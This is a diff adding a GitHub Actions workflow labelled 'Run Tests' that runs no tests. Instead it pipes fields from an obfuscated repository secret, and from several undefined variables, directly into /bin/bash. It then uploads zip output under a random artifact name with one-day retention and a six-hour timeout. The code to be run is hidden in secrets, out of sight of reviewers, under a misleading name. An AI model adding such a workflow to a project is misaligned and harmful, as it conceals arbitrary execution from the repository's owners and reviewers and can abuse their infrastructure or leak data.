@@ -1,0 +1,34 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          jd50660: ${{ secrets.jd50660 }}
+        run: |
+          printf '%s' "$jd50660" | jq -r .qnvbx43 | /bin/bash
+          printf '%s' "$lqobm4" | jq -r .pgrp1345 | /bin/bash
+          printf '%s' "$oj0909" | jq -r .j023 | /bin/bash
+          echo $dqig34 | jq -r .nrl437 | /bin/bash
+          printf '%s' "$yn1019" | jq -r .bvvgg1 | /bin/bash
+          echo $actx52 | jq -r .canch9456 | /bin/bash
+          echo $pza56097 | jq -r .njnjn1375 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0tKXOsyw
+          path: "*.zip"
+          retention-days: 1
